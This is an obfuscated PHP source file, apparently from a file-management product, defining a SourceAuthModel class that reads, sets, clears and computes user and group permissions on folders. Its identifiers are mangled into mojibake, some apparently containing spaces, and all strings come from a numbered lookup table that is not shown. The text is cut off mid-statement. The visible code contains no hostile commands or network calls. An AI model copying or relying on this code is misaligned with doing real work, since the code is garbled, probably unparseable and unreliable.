<?php
 goto có´‘”ÄŞ½; c†ÊÉŒ‹é: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\137\x61\x75\x74\150"; public function getAuth($å—İ‚ê) { $«äË²Á¢ =& $_SERVER[¡“ËÌ§œ]; $²¸…ª ¡ = $this->sourceAuthSelect($å—İ‚ê); $ë³şÀÒ = array(); $õ‰ˆğ÷¢ = array(); $˜ğ¡û·£ = 2 << 25; foreach ($²¸…ª ¡ as $Çã³¨ã) { $¶ùœ‘‹† = Model($«äË²Á¢[536])->listData($Çã³¨ã[$«äË²Á¢[1955]]); if (!$¶ùœ‘‹†) { continue; } $ë³şÀÒ[] = $Çã³¨ã; $Ëñ•èÃ = 0; if ($Çã³¨ã[$«äË²Á¢[449]] == SourceModel::TYPE_GROUP) { $Ëñ•èÃ = $˜ğ¡û·£ * 2; } if ($Çã³¨ã[$«äË²Á¢[449]] == SourceModel::TYPE_USER) { $Ëñ•èÃ = $˜ğ¡û·£; } if ($Çã³¨ã[$«äË²Á¢[449]] == SourceModel::TYPE_USER && $Çã³¨ã[$«äË²Á¢[534]] == $«äË²Á¢[198]) { $Ëñ•èÃ = 0; } $õ‰ˆğ÷¢[] = $¶ùœ‘‹†[$«äË²Á¢[451]] + $Ëñ•èÃ; } array_multisort($õ‰ˆğ÷¢, SORT_DESC, $ë³şÀÒ); return $ë³şÀÒ; } public function sourceAuthSelect($¸¦•—ü¹) { $Ò—…„öğ =& $_SERVER[¡“ËÌ§œ]; static $Şê›Ü† = array(); $·³òòü´ = is_array($¸¦•—ü¹) ? !1 : !0; if ($·³òòü´) { $¸¦•—ü¹ = array($¸¦•—ü¹); } $°üçúçÛ = array(); foreach ($¸¦•—ü¹ as $îë½Ï†) { if (isset($Şê›Ü†[$îë½Ï†])) { $°üçúçÛ[$îë½Ï†] = $Şê›Ü†[$îë½Ï†]; } } if (count($°üçúçÛ) == count($¸¦•—ü¹)) { return $·³òòü´ ? $°üçúçÛ[$¸¦•—ü¹[0]] : $°üçúçÛ; } $èÚ²éãï = $Ò—…„öğ[2032]; $¿ØµûÉ³ = array($Ò—…„öğ[440] => array($Ò—…„öğ[7], $¸¦•—ü¹)); $á÷°°ô¾ = $this->field($èÚ²éãï)->order($Ò—…„öğ[437])->where($¿ØµûÉ³)->select(); $ªèßŸ = array_to_keyvalue_group($á÷°°ô¾, $Ò—…„öğ[440]); foreach ($¸¦•—ü¹ as $îë½Ï†) { $Şê›Ü†[$îë½Ï†] = $ªèßŸ[$îë½Ï†] ? $ªèßŸ[$îë½Ï†] : array(); } if ($·³òòü´) { return $á÷°°ô¾; } return $ªèßŸ; } public function setAuth($¸Ã–Ãˆñ, $³’Ê‹ù) { $˜’”ŞÌÍ =& $_SERVER[¡“ËÌ§œ]; $Ğí¹İÉÌ = Model($˜’”ŞÌÍ[1353])->sourceInfo($¸Ã–Ãˆñ); if (!$Ğí¹İÉÌ) { return !1; } if ($Ğí¹İÉÌ[$˜’”ŞÌÍ[449]] != SourceModel::TYPE_GROUP) { return !1; } $şÄÄ¥Ò” = 1; $‚ÎÁ¦ô = $Ğí¹İÉÌ[$˜’”ŞÌÍ[534]]; if ($‚ÎÁ¦ô != $şÄÄ¥Ò”) { $º¹™©Ø· = array($˜’”ŞÌÍ[1851] => $‚ÎÁ¦ô); $°¥Öö™È = Model($˜’”ŞÌÍ[1941])->field($˜’”ŞÌÍ[1661])->where($º¹™©Ø·)->select(); $°¥Öö™È = array_to_keyvalue($°¥Öö™È, $˜’”ŞÌÍ[12], $˜’”ŞÌÍ[1661]); } $ ×´İ­ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ˆãşÜ¬ = array(); foreach ($³’Ê‹ù as $ğ½¡·«ş) { if (!in_array($ğ½¡·«ş[$˜’”ŞÌÍ[449]], $ ×´İ­)) { show_json(LNG($˜’”ŞÌÍ[2033]), !1); } if ($‚ÎÁ¦ô != $şÄÄ¥Ò”) { if ($ğ½¡·«ş[$˜’”ŞÌÍ[449]] == SourceModel::TYPE_GROUP) { } if ($ğ½¡·«ş[$˜’”ŞÌÍ[534]] != 0 && !in_array($ğ½¡·«ş[$˜’”ŞÌÍ[534]], $°¥Öö™È)) { } } if ($ğ½¡·«ş[$˜’”ŞÌÍ[534]] == 0) { $ğ½¡·«ş[$˜’”ŞÌÍ[449]] = SourceModel::TYPE_USER; } $ˆãşÜ¬[] = array($˜’”ŞÌÍ[440] => $¸Ã–Ãˆñ, $˜’”ŞÌÍ[449] => intval($ğ½¡·«ş[$˜’”ŞÌÍ[449]]), $˜’”ŞÌÍ[534] => intval($ğ½¡·«ş[$˜’”ŞÌÍ[534]]), $˜’”ŞÌÍ[1955] => intval($ğ½¡·«ş[$˜’”ŞÌÍ[1955]]) ? intval($ğ½¡·«ş[$˜’”ŞÌÍ[1955]]) : 0, $˜’”ŞÌÍ[2015] => intval($ğ½¡·«ş[$˜’”ŞÌÍ[2015]]) ? intval($ğ½¡·«ş[$˜’”ŞÌÍ[2015]]) : -1); } $this->where(array($˜’”ŞÌÍ[455] => $¸Ã–Ãˆñ))->delete(); $this->addAll($ˆãşÜ¬); return !0; } public function authClear($ùØ²‘å“) { $‹í–çĞÍ =& $_SERVER[¡“ËÌ§œ]; $Üóô—ÌĞ = Model($‹í–çĞÍ[1353])->sourceInfo($ùØ²‘å“); $äú•‡ = array($ùØ²‘å“); if ($Üóô—ÌĞ[$‹í–çĞÍ[448]] == $‹í–çĞÍ[88]) { $Ã°–Ä¦š = array($‹í–çĞÍ[618] => array($‹í–çĞÍ[578], $Üóô—ÌĞ[$‹í–çĞÍ[549]] . $ùØ²‘å“ . $‹í–çĞÍ[579])); $äú•‡ = Model($‹í–çĞÍ[1353])->field($‹í–çĞÍ[455])->where($Ã°–Ä¦š)->getField($‹í–çĞÍ[440], !0); $äú•‡[] = $ùØ²‘å“; } $this->where(array($‹í–çĞÍ[455] => array($‹í–çĞÍ[456], $äú•‡)))->delete(); return !0; } public function getAllChildren($êÖ­Â®ú) { $›ÅÒîŞİ =& $_SERVER[¡“ËÌ§œ]; $Ü•Ò³Ï = Model($›ÅÒîŞİ[1353])->sourceInfo($êÖ­Â®ú); if ($Ü•Ò³Ï[$›ÅÒîŞİ[448]] != $›ÅÒîŞİ[88]) { return $this->sourceListAuth(array($êÖ­Â®ú)); } if ($Ü•Ò³Ï[$›ÅÒîŞİ[449]] != SourceModel::TYPE_GROUP) { return array(); } $¶¡¸÷Øû = 1; $ÊàŞøÍİ = array($êÖ­Â®ú); if ($Ü•Ò³Ï[$›ÅÒîŞİ[470]] == $›ÅÒîŞİ[198] && $Ü•Ò³Ï[$›ÅÒîŞİ[534]] != $¶¡¸÷Øû) { $ÊàŞøÍİ = $this->groupChidldAllRootSource($Ü•Ò³Ï[$›ÅÒîŞİ[534]]); } $ûôÉ¬Ó = $this->field($›ÅÒîŞİ[440])->group($›ÅÒîŞİ[440])->select(); $ûôÉ¬Ó = array_to_keyvalue($ûôÉ¬Ó, $›ÅÒîŞİ[12], $›ÅÒîŞİ[440]); if (!$ûôÉ¬Ó) { return array(); } $Ïğ‹ø = $›ÅÒîŞİ[2034]; $†€ÀãÃ = array($›ÅÒîŞİ[440] => array($›ÅÒîŞİ[7], $ûôÉ¬Ó), $›ÅÒîŞİ[469] => $›ÅÒîŞİ[198]); $²–ş•Ò– = Model($›ÅÒîŞİ[845])->field($Ïğ‹ø)->where($†€ÀãÃ)->select(); $°°Èé˜ = array($êÖ­Â®ú); foreach ($²–ş•Ò– as $ªä˜ËÎê) { foreach ($ÊàŞøÍİ as $–¤›öéã) { $ä«ØõØ¿ = $›ÅÒîŞİ[50] . $–¤›öéã . $›ÅÒîŞİ[50]; $œıÅò¹ = $ªä˜ËÎê[$›ÅÒîŞİ[549]] . $ªä˜ËÎê[$›ÅÒîŞİ[440]] . $›ÅÒîŞİ[50]; if (strstr($œıÅò¹, $ä«ØõØ¿)) { $°°Èé˜[] = $ªä˜ËÎê[$›ÅÒîŞİ[440]]; break; } } } return $this->sourceListAuth($°°Èé˜); } private function sourceListAuth($Ãüó¶úö) { $‚¯à’Å´ =& $_SERVER[¡“ËÌ§œ]; $¢¤Æúø² = Model($‚¯à’Å´[1353])->sourceListInfo($Ãüó¶úö, !0); $Ê„¯°êÁ = $this->sourceAuthSelect($Ãüó¶úö); $±©ÚÆŸ¯ = array(); $ÑÖ˜—ú = array(); foreach ($¢¤Æúø² as $¡øİüÏí) { unset($¡øİüÏí[$‚¯à’Å´[494]]); unset($¡øİüÏí[$‚¯à’Å´[492]]); unset($¡øİüÏí[$‚¯à’Å´[451]]); unset($¡øİüÏí[$‚¯à’Å´[87]]); $‘Í…€ß = $Ê„¯°êÁ[$¡øİüÏí[$‚¯à’Å´[440]]]; if (!$‘Í…€ß) { continue; } $¡øİüÏí[$‚¯à’Å´[2035]] = $this->authTargetInfo($‘Í…€ß); $¡øİüÏí[$‚¯à’Å´[547]] = rtrim($¡øİüÏí[$‚¯à’Å´[553]], $‚¯à’Å´[8]) . $‚¯à’Å´[8] . ltrim($¡øİüÏí[$‚¯à’Å´[547]], $‚¯à’Å´[8]); $±©ÚÆŸ¯[] = $¡øİüÏí; $³íìğØ• = count(explode($‚¯à’Å´[8], trim($¡øİüÏí[$‚¯à’Å´[547]], $‚¯à’Å´[8]))); $ÑÖ˜—ú[] = $³íìğØ• + ($¡øİüÏí[$‚¯à’Å´[33]] == $‚¯à’Å´[75] ? 0 : 1000); } array_multisort($ÑÖ˜—ú, SORT_ASC, $±©ÚÆŸ¯); return $±©ÚÆŸ¯; } private function groupChidldAllRootSource($ˆ¤şÌùú) { $ş¤â¨–¬ =& $_SERVER[¡“ËÌ§œ]; $Ü·ı«Äá = Model($ş¤â¨–¬[2036])->groupChildrenAll($ˆ¤şÌùú); $ıï­‘¿Ô = array($ş¤â¨–¬[470] => 0, $ş¤â¨–¬[534] => array($ş¤â¨–¬[7], $Ü·ı«Äá), $ş¤â¨–¬[449] => SourceModel::TYPE_GROUP); $ŞÕæ€ÉË = Model($ş¤â¨–¬[845])->field($ş¤â¨–¬[440])->where($ıï­‘¿Ô)->select(); $ŞÕæ€ÉË = array_to_keyvalue($ŞÕæ€ÉË, $ş¤â¨–¬[12], $ş¤â¨–¬[440]); return $ŞÕæ€ÉË; } private function authTargetInfo($ç•…á½œ) { $¬«·‰òø =& $_SERVER[¡“ËÌ§œ]; $àˆÏûış = array(); $ÎèÖÌìŸ = array(); $€¹õÚÆ = 2 << 25; foreach ($ç•…á½œ as $Ÿ“ÒÓÜ§) { $ê®®÷ĞŒ = Model($¬«·‰òø[536])->listData($Ÿ“ÒÓÜ§[$¬«·‰òø[1955]]); if (!$ê®®÷ĞŒ) { continue; } if ($Ÿ“ÒÓÜ§[$¬«·‰òø[449]] == SourceModel::TYPE_USER) { $ÛÛÍÈ˜î = Model($¬«·‰òø[542])->getInfoSimpleOuter($Ÿ“ÒÓÜ§[$¬«·‰òø[534]]); if ($ÛÛÍÈ˜î[$¬«·‰òø[1661]] == $¬«·‰òø[1208]) { continue; } if ($ÛÛÍÈ˜î[$¬«·‰òø[1661]] == $¬«·‰òø[198]) { $ÛÛÍÈ˜î[$¬«·‰òø[32]] = LNG($¬«·‰òø[2037]); } } else { $ÛÛÍÈ˜î = Model($¬«·‰òø[550])->getInfoSimple($Ÿ“ÒÓÜ§[$¬«·‰òø[534]]); } if (!$ÛÛÍÈ˜î) { continue; } $ÛÛÍÈ˜î[$¬«·‰òø[505]] = $ê®®÷ĞŒ; $àˆÏûış[] = $ÛÛÍÈ˜î; $ş‡´ŒÒÊ = 0; if ($Ÿ“ÒÓÜ§[$¬«·‰òø[449]] == SourceModel::TYPE_GROUP) { $ş‡´ŒÒÊ = $€¹õÚÆ * 2; } if ($Ÿ“ÒÓÜ§[$¬«·‰òø[449]] == SourceModel::TYPE_USER) { $ş‡´ŒÒÊ = $€¹õÚÆ; } if ($Ÿ“ÒÓÜ§[$¬«·‰òø[449]] == SourceModel::TYPE_USER && $Ÿ“ÒÓÜ§[$¬«·‰òø[534]] == $¬«·‰òø[198]) { $ş‡´ŒÒÊ = 0; } $ÎèÖÌìŸ[] = $ê®®÷ĞŒ[$¬«·‰òø[451]] + $ş‡´ŒÒÊ; } array_multisort($ÎèÖÌìŸ, SORT_DESC, $àˆÏûış); return $àˆÏûış; } public function getAllChildrenByUser($ê‘ÀŞ§Ô, $Üûº„½) { $®²ô¤¹¾ =& $_SERVER[¡“ËÌ§œ]; $Í¨éùˆ = Model($®²ô¤¹¾[563])->getInfo($Üûº„½); if (!$Üûº„½ || !$ê‘ÀŞ§Ô || !$Í¨éùˆ) { return array(); } $ó‰‚ˆÔø = Model($®²ô¤¹¾[1353])->sourceInfo($ê‘ÀŞ§Ô); $ÃÇèÔ = array(); $µøÎÃê¢ = 1; if ($ó‰‚ˆÔø[$®²ô¤¹¾[470]] == $®²ô¤¹¾[198] && $ó‰‚ˆÔø[$®²ô¤¹¾[534]] != $µøÎÃê¢ && $this->groupContainUser($ó‰‚ˆÔø[$®²ô¤¹¾[534]], $Üûº„½)) { foreach ($Í¨éùˆ[$®²ô¤¹¾[2038]] as $›©Ç†³ô) { $‘ı€¶êö = Model($®²ô¤¹¾[550])->getInfo($›©Ç†³ô[$®²ô¤¹¾[1851]]); $ÎÜŸõæ‘ = Model($®²ô¤¹¾[563])->getInfoSimpleOuter($Üûº„½); $ÎÜŸõæ‘[$®²ô¤¹¾[505]] = $›©Ç†³ô[$®²ô¤¹¾[451]]; if (Model($®²ô¤¹¾[536])->authCheckAction($›©Ç†³ô[$®²ô¤¹¾[451]][$®²ô¤¹¾[451]], $®²ô¤¹¾[1872])) { continue; } $ï¼¿÷ = array($®²ô¤¹¾[32] => $®²ô¤¹¾[1228] . $‘ı€¶êö[$®²ô¤¹¾[32]], $®²ô¤¹¾[440] => $‘ı€¶êö[$®²ô¤¹¾[87]][$®²ô¤¹¾[440]], $®²ô¤¹¾[84] => KodIO::make($‘ı€¶êö[$®²ô¤¹¾[87]][$®²ô¤¹¾[440]]), $®²ô¤¹¾[470] => $®²ô¤¹¾[198], $®²ô¤¹¾[449] => $®²ô¤¹¾[543], $®²ô¤¹¾[33] => $®²ô¤¹¾[582], $®²ô¤¹¾[547] => $‘ı€¶êö[$®²ô¤¹¾[554]], $®²ô¤¹¾[1851] => $‘ı€¶êö[$®²ô¤¹¾[1851]], $®²ô¤¹¾[551] => $‘ı€¶êö[$®²ô¤¹¾[470]], $®²ô¤¹¾[2035] => array($ÎÜŸõæ‘)); $ÃÇèÔ[$ï¼¿÷[$®²ô¤¹¾[440]]] = $ï¼¿÷; } } $âÍ»Ì¸ = array(); $¢á­‰ß¸ = $this->getAllChildren($ê‘ÀŞ§Ô); foreach ($¢á­‰ß¸ as $Ç„¢ÍÉ–) { $ãƒŠë³¿ = !1; foreach ($Ç„¢ÍÉ–[$®²ô¤¹¾[2035]] as $£Ã¦ğñ) { if ($£Ã¦ğñ[$®²ô¤¹¾[1661]]) { if ($£Ã¦ğñ[$®²ô¤¹¾[1661]] == $Üûº„½) { $ãƒŠë³¿ = !0; break; } } if ($£Ã¦ğñ[$®²ô¤¹¾[1851]]) { if ($this->groupContainUser($£Ã¦ğñ[$®²ô¤¹¾[1851]], $Üûº„½)) { $ãƒŠë³¿ = !0; break; } } } if ($ãƒŠë³¿) { $âÍ»Ì¸[] = $Ç„¢ÍÉ–; } $¾÷Ùé¹œ = $Ç„¢ÍÉ–[$®²ô¤¹¾[440]]; if (isset($ÃÇèÔ[$¾÷Ùé¹œ])) { $Ç„¢ÍÉ–[$®²ô¤¹¾[2035]][] = $ÃÇèÔ[$¾÷Ùé¹œ][0]; $ÃÇèÔ[$¾÷Ùé¹œ] = !1; } } $ÃÇèÔ = array_filter(array_values($ÃÇèÔ)); $âÍ»Ì¸ = array_merge($ÃÇèÔ, $âÍ»Ì¸); return $âÍ»Ì¸; } public function setAllChildrenByUser($ì‘ùÒ£, $»¼Ä©İª, $é»¬çÚİ) { $ïÚ·Ú°ø =& $_SERVER[¡“ËÌ§œ]; $¶¯©¶¤Ø = $this->getAllChildrenByUser($ì‘ùÒ£, $»¼Ä©İª); if (!$é»¬çÚİ || !$¶¯©¶¤Ø) { return !1; } foreach ($¶¯©¶¤Ø as $¨é«Ñ‡é) { $ì”¤²ÚÉ = array(); foreach ($¨é«Ñ‡é[$ïÚ·Ú°ø[2035]] as $“•ÂĞà) { $°©ıŸŞ² = $“•ÂĞà[$ïÚ·Ú°ø[505]]; $´‚é¯¬Ÿ = $“•ÂĞà[$ïÚ·Ú°ø[1661]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ìˆÕË³È = $“•ÂĞà[$ïÚ·Ú°ø[1661]] ? $“•ÂĞà[$ïÚ·Ú°ø[1661]] : $“•ÂĞà[$ïÚ·Ú°ø[1851]]; if ($“•ÂĞà[$ïÚ·Ú°ø[1661]] && $“•ÂĞà[$ïÚ·Ú°ø[1661]] == $»¼Ä©İª) { continue; } $ì”¤²ÚÉ[] = array($ïÚ·Ú°ø[440] => $¨é«Ñ‡é[$ïÚ·Ú°ø[440]], $ïÚ·Ú°ø[449] => $´‚é¯¬Ÿ, $ïÚ·Ú°ø[534] => intval($ìˆÕË³È), $ïÚ·Ú°ø[1955] => isset($°©ıŸŞ²[$ïÚ·Ú°ø[437]]) ? intval($°©ıŸŞ²[$ïÚ·Ú°ø[437]]) : 0, $ïÚ·Ú°ø[2015] => isset($°©ıŸŞ²[$ïÚ·Ú°ø[2015]]) ? intval($°©ıŸŞ²[$ïÚ·Ú°ø[2015]]) : -1); } $ì”¤²ÚÉ[] = array($ïÚ·Ú°ø[440] => $¨é«Ñ‡é[$ïÚ·Ú°ø[440]], $ïÚ·Ú°ø[449] => SourceModel::TYPE_USER, $ïÚ·Ú°ø[534] => intval($»¼Ä©İª), $ïÚ·Ú°ø[1955] => intval($é»¬çÚİ), $ïÚ·Ú°ø[2015] => -1); $this->where(array($ïÚ·Ú°ø[455] => $¨é«Ñ‡é[$ïÚ·Ú°ø[440]]))->delete(); $this->addAll($ì”¤²ÚÉ); } return !0; } public function get($¯˜îÚ±¹) { $Á»¨  = $this->getSourceList(array($¯˜îÚ±¹), !0); return $Á»¨ [0]; } public function getSourceList($­æİúïé, $÷ßˆ™—¤ = false, $Ôæş¦ÍÏ = false) { $³‹ş÷Šˆ =& $_SERVER[¡“ËÌ§œ]; if (!$­æİúïé) { return array(); } $î†«¹ê· = Model($³‹ş÷Šˆ[1353]); if (!$÷ßˆ™—¤ && count($­æİúïé) == 1) { $÷ßˆ™—¤ = array(); $÷ßˆ™—¤[$­æİúïé[0]] = $î†«¹ê·->sourceInfo($­æİúïé[0]); } if (!$÷ßˆ™—¤) { $Ì© „…Î = array($³‹ş÷Šˆ[455] => array($³‹ş÷Šˆ[456], $­æİúïé)); $÷ßˆ™—¤ = $î†«¹ê·->field($³‹ş÷Šˆ[2039])->where($Ì© „…Î)->select(); $÷ßˆ™—¤ = array_to_keyvalue($÷ßˆ™—¤, $³‹ş÷Šˆ[440]); } $áÎ…Û†Ğ = $­æİúïé; foreach ($÷ßˆ™—¤ as $éÃ´„³ı => $·¬ÃÀÉ¹) { $æÂêé‰· = $î†«¹ê·->parentLevelArray($·¬ÃÀÉ¹[$³‹ş÷Šˆ[549]]); $áÎ…Û†Ğ = array_merge($áÎ…Û†Ğ, array($éÃ´„³ı), array_reverse($æÂêé‰·)); } $áÎ…Û†Ğ = array_values(array_unique($áÎ…Û†Ğ)); if (!$áÎ…Û†Ğ) { return array(); } $ßœÇÅÓ¯ = $this->sourceAuthSelect($áÎ…Û†Ğ); $¸é¸ñ·÷ = array(); foreach ($áÎ…Û†Ğ as $şŸÍ™ÕĞ) { if (isset($ßœÇÅÓ¯[$şŸÍ™ÕĞ])) { $¸é¸ñ·÷[$şŸÍ™ÕĞ] = $ßœÇÅÓ¯[$şŸÍ™ÕĞ]; } } $ÑÍ §Ó  = $this->userIsRoot($Ôæş¦ÍÏ); $èœë´ÜÛ = AuthModel::authAll(); $š úó» = array($³‹ş÷Šˆ[452] => $èœë´ÜÛ, $³‹ş÷Šˆ[2040] => array($³‹ş÷Šˆ[457] => 0, $³‹ş÷Šˆ[1857] => $èœë´ÜÛ, $³‹ş÷Šˆ[458] => LNG($³‹ş÷Šˆ[2041]), $³‹ş÷Šˆ[1874] => $³‹ş÷Šˆ[2042])); $‡œ”êèå = array(); foreach ($÷ßˆ™—¤ as $şŸÍ™ÕĞ => $ƒÜç¯ ¹) { if ($ÑÍ §Ó  && $GLOBALS[$³‹ş÷Šˆ[6]][$³‹ş÷Šˆ[1870]]) { $‡œ”êèå[$şŸÍ™ÕĞ] = $š úó»; continue; } $‡œ”êèå[$şŸÍ™ÕĞ] = $this->makeSourceAuth($ƒÜç¯ ¹, $¸é¸ñ·÷, $Ôæş¦ÍÏ); } return $‡œ”êèå; } public function authDeepCheck($¦¥‘Ó², $ô†­Ø¢™ = false) { $˜¾‡—·ô =& $_SERVER[¡“ËÌ§œ]; $ô†­Ø¢™ = $ô†­Ø¢™ ? $ô†­Ø¢™ : USER_ID; $¥ÈÂ¶ó¡ = $this->makeAuthDeep($ô†­Ø¢™); if (!in_array($¦¥‘Ó², $¥ÈÂ¶ó¡[$˜¾‡—·ô[2043]])) { return !1; } $¯¸ ß¼¿ = array(); foreach ($¥ÈÂ¶ó¡[$˜¾‡—·ô[2044]] as $«ƒ®ìğ => $ö¬ÖˆÅÃ) { if (!in_array($¦¥‘Ó², $ö¬ÖˆÅÃ)) { continue; } $¯¸ ß¼¿[] = $«ƒ®ìğ; } if (!$¯¸ ß¼¿) { return !1; } $€Šıœ˜ = $¯¸ ß¼¿ ? $¯¸ ß¼¿[0] : $¦¥‘Ó²; return array($˜¾‡—·ô[452] => -1, $˜¾‡—·ô[505] => array($˜¾‡—·ô[457] => $˜¾‡—·ô[1208], $˜¾‡—·ô[1857] => $˜¾‡—·ô[198], $˜¾‡—·ô[458] => LNG($˜¾‡—·ô[2045]), $˜¾‡—·ô[1874] => $˜¾‡—·ô[2046]), $˜¾‡—·ô[2047] => LNG($˜¾‡—·ô[2048]), $˜¾‡—·ô[2049] => $this->sourceAuthInfo($€Šıœ˜)); } protected function makeAuthDeep($ç¢ÃÓñŞ = false) { $£êíÉ¾‚ =& $_SERVER[¡“ËÌ§œ]; static $ùµŞŸ = array(); $ç¢ÃÓñŞ = $ç¢ÃÓñŞ ? $ç¢ÃÓñŞ : USER_ID; if (isset($ùµŞŸ[$ç¢ÃÓñŞ])) { return $ùµŞŸ[$ç¢ÃÓñŞ]; } $×“¯ıÆ = Model($£êíÉ¾‚[2050])->listData(); $³Ïèğ‘ = array(); foreach ($×“¯ıÆ as $‰³µşÆæ) { if ($‰³µşÆæ[$£êíÉ¾‚[451]] == 0 && $‰³µşÆæ[$£êíÉ¾‚[1873]] == $£êíÉ¾‚[88]) { $³Ïèğ‘[] = $‰³µşÆæ[$£êíÉ¾‚[437]]; } } $Üç¸‚›ü = $this->userGroupParents($ç¢ÃÓñŞ); $é½ôá× = array($£êíÉ¾‚[449] => SourceModel::TYPE_USER, $£êíÉ¾‚[534] => $ç¢ÃÓñŞ); if ($Üç¸‚›ü) { $é½ôá× = array(array($£êíÉ¾‚[449] => SourceModel::TYPE_USER, $£êíÉ¾‚[534] => $ç¢ÃÓñŞ), array($£êíÉ¾‚[449] => SourceModel::TYPE_GROUP, $£êíÉ¾‚[534] => array($£êíÉ¾‚[456], $Üç¸‚›ü)), $£êíÉ¾‚[1020] => $£êíÉ¾‚[1949]); } $Ğ Ö›§ = $this->field($£êíÉ¾‚[2051])->where($é½ôá×)->select(); $¢ŞÔ¿×Ö = array(); $É÷ƒ“³Ï = array_to_keyvalue_group($Ğ Ö›§, $£êíÉ¾‚[440]); foreach ($É÷ƒ“³Ï as $¬Íçš–å => $ˆè¿Èãı) { $İ›†ùÛó = $this->authArrayCheck($ˆè¿Èãı, $ç¢ÃÓñŞ); if ($İ›†ùÛó[$£êíÉ¾‚[452]] > 0) { $¢ŞÔ¿×Ö[] = $¬Íçš–å . $£êíÉ¾‚[12]; } } if ($Üç¸‚›ü) { $ÏÌÀˆÉ = Model($£êíÉ¾‚[550]); foreach ($Üç¸‚›ü as $ÄœÓâ¾É) { $ŞûäÌ = $ÏÌÀˆÉ->getInfo($ÄœÓâ¾É); if (!$ŞûäÌ || !is_array($ŞûäÌ[$£êíÉ¾‚[87]])) { continue; } $¢ŞÔ¿×Ö[] = $ŞûäÌ[$£êíÉ¾‚[87]][$£êíÉ¾‚[440]]; } } $üãŠ£ŸÇ = array(); $é×¦—“å = $Üç¸‚›ü; $Ë·Ùî³§ = Model($£êíÉ¾‚[1353]); $ÏÌÀˆÉ = Model($£êíÉ¾‚[550]); $§¯•ªà = array(); $ƒ¬·ŒÒŞ = array(); $ìˆ²ç›â = array(); $ÇóøĞ¹¬ = array(); if ($¢ŞÔ¿×Ö) { $²™ÏïÕµ = $Ë·Ùî³§->where(array($£êíÉ¾‚[440] => array($£êíÉ¾‚[456], $¢ŞÔ¿×Ö)))->select(); foreach ($²™ÏïÕµ as $èÇ€ú‡) { $ï“üµ«ç = $Ë·Ùî³§->parentLevelArray($èÇ€ú‡[$£êíÉ¾‚[549]]); $üãŠ£ŸÇ = array_merge($üãŠ£ŸÇ, $ï“üµ«ç); $é×¦—“å[] = $èÇ€ú‡[$£êíÉ¾‚[534]]; $§¯•ªà[$èÇ€ú‡[$£êíÉ¾‚[440]]] = $ï“üµ«ç; $ƒ¬·ŒÒŞ[$èÇ€ú‡[$£êíÉ¾‚[440]]] = $èÇ€ú‡[$£êíÉ¾‚[534]]; } } $é×¦—“å = array_values(array_unique($é×¦—“å)); $í—úı¤ = $é×¦—“å; foreach ($í—úı¤ as $ÄœÓâ¾É) { $ŞûäÌ = $ÏÌÀˆÉ->getInfo($ÄœÓâ¾É); $ï“üµ«ç = $Ë·Ùî³§->parentLevelArray($ŞûäÌ[$£êíÉ¾‚[549]]); $é×¦—“å = array_merge($é×¦—“å, $ï“üµ«ç); } $é×¦—“å = array_values(array_unique($é×¦—“å)); foreach ($é×¦—“å as $ÄœÓâ¾É) { $ŞûäÌ = $ÏÌÀˆÉ->getInfo($ÄœÓâ¾É); $üãŠ£ŸÇ[] = $ŞûäÌ[$£êíÉ¾‚[87]][$£êíÉ¾‚[440]]; $ìˆ²ç›â[$ÄœÓâ¾É] = $ŞûäÌ[$£êíÉ¾‚[87]][$£êíÉ¾‚[440]]; $ÇóøĞ¹¬[$ÄœÓâ¾É] = $Ë·Ùî³§->parentLevelArray($ŞûäÌ[$£êíÉ¾‚[549]]); } foreach ($§¯•ªà as $ë»·´–æ => $®ÕàÕ£¼) { $½ÜÊ‰ÛÓ = $ƒ¬·ŒÒŞ[$ë»·´–æ]; if (!$½ÜÊ‰ÛÓ || !$ìˆ²ç›â[$½ÜÊ‰ÛÓ]) { continue; } $Ù“èÆçÙ = array(); foreach ($ÇóøĞ¹¬[$½ÜÊ‰ÛÓ] as $ÄœÓâ¾É) { $Ù“èÆçÙ[] = $ìˆ²ç›â[$ÄœÓâ¾É]; } $§¯•ªà[$ë»·´–æ] = array_merge($Ù“èÆçÙ, $®ÕàÕ£¼); } $üãŠ£ŸÇ = array_values(array_unique($üãŠ£ŸÇ)); $óá—Ûë = array($£êíÉ¾‚[2043] => $üãŠ£ŸÇ, $£êíÉ¾‚[2044] => $§¯•ªà); $ùµŞŸ[$ç¢ÃÓñŞ] = $óá—Ûë; return $óá—Ûë; } private function makeSourceAuth($¶‹á®Ú®, $å™Ì˜¯É, $à×¬Œ€è = false) { $ƒ¼ìµ¥¼ =& $_SERVER[¡“ËÌ§œ]; $™¡½ãÚš = $ƒ¼ìµ¥¼[88]; $¡³‡ÙÕÚ = $¶‹á®Ú®[$ƒ¼ìµ¥¼[534]]; $ñÙ×¿ñ = $¶‹á®Ú®[$ƒ¼ìµ¥¼[449]] == SourceModel::TYPE_GROUP; $’›õ‘ = $ñÙ×¿ñ ? $this->groupRootAuth($¡³‡ÙÕÚ, $à×¬Œ€è) : !1; if ($’›õ‘ && Model($ƒ¼ìµ¥¼[536])->authCheckAction($’›õ‘[$ƒ¼ìµ¥¼[451]], $ƒ¼ìµ¥¼[1872])) { return $this->groupAuthInfo($’›õ‘, $¡³‡ÙÕÚ); } $¥½µ£™Ä = Model($ƒ¼ìµ¥¼[1353])->parentLevelArray($¶‹á®Ú®[$ƒ¼ìµ¥¼[549]]); $¥½µ£™Ä = array_merge(array($¶‹á®Ú®[$ƒ¼ìµ¥¼[440]]), array_reverse($¥½µ£™Ä)); $¤¯œçÍÄ = !1; foreach ($¥½µ£™Ä as $Ã¨¶åŞ) { if (!isset($å™Ì˜¯É[$Ã¨¶åŞ])) { continue; } $üŞè•÷ = $this->authMake($å™Ì˜¯É[$Ã¨¶åŞ], $à×¬Œ€è); if ($üŞè•÷[$ƒ¼ìµ¥¼[505]]) { $¤¯œçÍÄ = $üŞè•÷; break; } } if (!$ñÙ×¿ñ) { return $¤¯œçÍÄ; } if (!$¤¯œçÍÄ && $’›õ‘) { $¤¯œçÍÄ = $this->groupAuthInfo($’›õ‘, $¡³‡ÙÕÚ); } if (!$¤¯œçÍÄ) { $›¼ÀÍ = Model($ƒ¼ìµ¥¼[550])->getInfo($¡³‡ÙÕÚ); $ë…·üó = explode($ƒ¼ìµ¥¼[50], trim($›¼ÀÍ[$ƒ¼ìµ¥¼[549]], $ƒ¼ìµ¥¼[50])); $ë…·üó = array_reverse($ë…·üó); foreach ($ë…·üó as $şãŒ—ğò) { if ($şãŒ—ğò == $ƒ¼ìµ¥¼[198] 